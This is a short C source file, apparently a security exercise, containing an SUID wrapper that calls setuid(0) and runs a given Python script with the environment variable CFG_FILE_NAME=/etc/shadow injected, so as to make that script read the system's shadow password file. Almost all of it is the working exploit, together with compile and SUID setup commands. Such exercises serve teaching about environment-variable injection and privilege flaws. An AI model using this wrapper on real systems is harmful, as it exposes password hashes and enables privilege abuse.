/*********************************************************
*
* Description: SUID wrapper that injects CFG_FILE_NAME=/etc/shadow
*              into a Python script's environment to exploit ex1.py
* Author: Moshe Yifrah
*
* Compile with: gcc -o wrapper wrapper.c
*
* Run by: sudo chown root wrapper && sudo chmod u+s wrapper
*         ./wrapper ex1.py
*
*********************************************************/

#include <unistd.h>
#include <stdio.h>

int main(int argc, char *argv[]) 
{
    if (argc < 2) {
        printf("Usage: %s <path_to_script>\n", argv[0]);
        return 1;
    }
    
    // Elevate privileges to root explicitly
    setuid(0);
    
    // EXPLOIT: Define the malicious environment variable
    char *envp[] = {"CFG_FILE_NAME=/etc/shadow", NULL};
    
    // Execute the Python script passed as argv[1] with the injected environment
    execle("/usr/bin/python3", "python3", argv[1], NULL, envp);
    
    return 0;
}
